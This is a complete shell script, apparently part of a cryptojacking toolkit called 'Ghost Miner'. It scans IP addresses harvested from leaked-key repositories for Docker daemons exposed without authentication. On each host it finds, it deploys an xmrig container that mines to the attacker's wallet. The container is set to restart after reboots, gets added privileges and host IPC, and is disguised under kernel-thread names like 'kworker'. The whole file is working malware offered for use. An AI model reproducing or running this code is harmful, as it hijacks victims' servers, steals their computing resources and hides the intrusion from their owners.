#!/bin/sh
# ============================================================================
# Ghost Miner docker spreader - the one vector that needs NO credentials.
#
# An exposed daemon on :2375 (or TLS :2376) needs no key, no username and no
# (key,user,host) pairing - you just POST a container that mines. curl only, so
# nothing has to exist on the victim, not even the docker CLI.
#
# The container is created with RestartPolicy=always (it comes back with the
# daemon, including after a reboot), CpuShares 512 (container equivalent of our
# niceness) and a boring name.
#
# Hosts come from the hunter's own list: every IP any leaked-key repo mentioned,
# whether or not it ever answered SSH. That is the point - this reaches boxes
# the SSH path can never touch, because nothing has to match.
#
# State: .hunt/dock.seen (daemon found, never rescanned) and .hunt/dock.tried
# (scanned, nothing there - rescanned after DOCK_RETRY so a later daemon is
# still caught).
# ============================================================================
set -eu

SELF_DIR=$(CDPATH= cd -- "$(dirname -- "$0")" && pwd)
SYSDIR="${SYSDIR:-/tmp/.sysd}"
[ -r "$SYSDIR/worker.env" ] && . "$SYSDIR/worker.env"
[ -r "$SELF_DIR/worker.env" ] && . "$SELF_DIR/worker.env"
WORK="${HUNT_WORK:-$SELF_DIR/.hunt}"
mkdir -p "$WORK"

IMAGE="${DOCK_IMAGE:-xmrig/xmrig}"
MAX="${DOCK_MAX_HOSTS:-120}"      # hosts scanned per run
PAR="${DOCK_PAR:-20}"             # concurrent probes
RETRY="${DOCK_RETRY:-604800}"     # rescAN a dead host after 7d
PORTS="${DOCK_PORTS:-2375 2376}"
SEEN="$WORK/dock.seen"            # daemon found here
TRIED="$WORK/dock.tried"          # scanned, nothing (ts \t ip)
OWNFILE="$WORK/dock.owned"        # endpoints we put a container on
touch "$SEEN" "$TRIED" "$OWNFILE"
NOW=$(date +%s)

[ -n "${WALLET:-}" ] || { echo "dock: WALLET unset"; exit 0; }
[ -n "${POOL:-}" ]   || { echo "dock: POOL unset"; exit 0; }

HOSTS="$WORK/dockhosts.$$"
{ cut -f3 "$WORK/targets.txt" 2>/dev/null || :
  cut -f3 "$WORK/loot.txt" 2>/dev/null || :; } \
    | grep -E '^[0-9]{1,3}(\.[0-9]{1,3}){3}$' | sort -u > "$HOSTS"

# container command line (wallet/pool/rig, same identity as the ssh payload).
# SYS_ADMIN + host IPC let xmrig apply the MSR mod and reach the host's hugepage
# pool, otherwise it logs "HASHRATE WILL BE LOW" and loses a chunk of the speed.
CMDS="\"-o\",\"$POOL\",\"-u\",\"$WALLET\",\"-p\",\"${RIG_ID:-node}\",\"--no-color\",\"-k\""
case "${TLS:-true}" in
    true|TRUE|1|yes) CMDS="$CMDS,\"--tls\"" ;;
esac
BODY="{\"Image\":\"$IMAGE\",\"Cmd\":[$CMDS],\"HostConfig\":{\"RestartPolicy\":{\"Name\":\"always\"},\"CpuShares\":512,\"CapAdd\":[\"SYS_ADMIN\"],\"IpcMode\":\"host\"}}"

# a host is interesting only if a docker API answers - so verify it IS docker,
# not just an open port (and no /dev/tcp, so bash is not required either)
endpoint() {
    for p in $PORTS; do
        case "$p" in
            2375) b="http://$1:2375";  o="" ;;
            2376) b="https://$1:2376"; o="-k" ;;
            *) continue ;;
        esac
        v=$(curl -fsS $o --max-time 4 "$b/version" 2>/dev/null) || continue
        case "$v" in *ApiVersion*) printf '%s|%s\n' "$b" "$o"; return 0 ;; esac
    done
    return 1
}

dock_one() {
    ip=$1
    ep=$(endpoint "$ip") || {
        printf '%s\t%s\n' "$NOW" "$ip" >> "$TRIED"
        return 0
    }
    base=${ep%|*}
    opts=${ep#*|}

    ver=$(curl -fsS $opts --max-time 4 "$base/version" 2>/dev/null) || ver=""
    vs=$(printf '%s' "$ver" | grep -o '"Version":"[^"]*"' | head -1 | cut -d'"' -f4)
    printf '%s\n' "$ip" >> "$SEEN"
    echo "dock: daemon $ip  $base  docker=${vs:-?}"

    # pick a free boring name; if one already runs our image, reuse it
    name=""
    for n in kworker kworker1 kworker2 kworker3; do
        if insp=$(curl -fsS $opts --max-time 5 "$base/containers/$n/json" 2>/dev/null); then
            case "$insp" in
                *"\"Image\":\"$IMAGE\""*)
                    name=$n
                    case "$insp" in
                        *'"Running":true'*)
                            echo "dock: $ip already runs ours ($name)" ;;
                        *)
                            curl -fsS $opts --max-time 10 -X POST \
                                 "$base/containers/$name/start" >/dev/null 2>&1 || :
                            echo "dock: $ip restarted our container ($name)" ;;
                    esac
                    printf '%s\t%s\n' "$ip" "$name" >> "$OWNFILE"
                    return 0 ;;
                *) continue ;;   # someone else's container holds that name
            esac
        fi
        name=$n
        break
    done
    [ -n "$name" ] || { echo "dock: $ip all names taken"; return 0; }

    # pull only if the image is not already there (their bandwidth)
    if ! curl -fsS $opts --max-time 6 "$base/images/$IMAGE/json" >/dev/null 2>&1; then
        echo "dock: $ip pulling $IMAGE"
        curl -fsS $opts --max-time 300 -X POST \
             "$base/images/create?fromImage=$IMAGE" >/dev/null 2>&1 || :
    fi

    if curl -fsS $opts --max-time 30 -X POST "$base/containers/create?name=$name" \
            -H "Content-Type: application/json" -d "$BODY" >/dev/null 2>&1; then
        if curl -fsS $opts --max-time 20 -X POST \
                "$base/containers/$name/start" >/dev/null 2>&1; then
            printf '%s\t%s\n' "$ip" "$name" >> "$OWNFILE"
            echo "dock: DEPLOYED $name -> $ip (restart=always)"
        else
            echo "dock: created but start failed on $ip"
        fi
    else
        echo "dock: create failed on $ip"
    fi
}

queued=$(wc -l < "$HOSTS")
echo "dock: $queued hosts in queue, cap $MAX, parallel $PAR"
n=0
while read -r ip; do
    [ -n "$ip" ] || continue
    grep -qxF "$ip" "$SEEN" 2>/dev/null && continue
    if awk -v now="$NOW" -v retry="$RETRY" -v ip="$ip" \
            '$2 == ip && $1 > now - retry { f = 1 } END { exit !f }' "$TRIED"; then
        continue
    fi
    n=$((n + 1))
    if [ "$n" -gt "$MAX" ]; then echo "dock: cap $MAX reached, rest stays queued"; break; fi
    dock_one "$ip" &
    if [ $((n % PAR)) -eq 0 ]; then wait || true; fi
done < "$HOSTS"
wait || true
rm -f "$HOSTS"
sort -u "$OWNFILE" -o "$OWNFILE" 2>/dev/null || true
echo "dock: scanned $n, daemons known $(wc -l < "$SEEN"), containers placed $(wc -l < "$OWNFILE")"

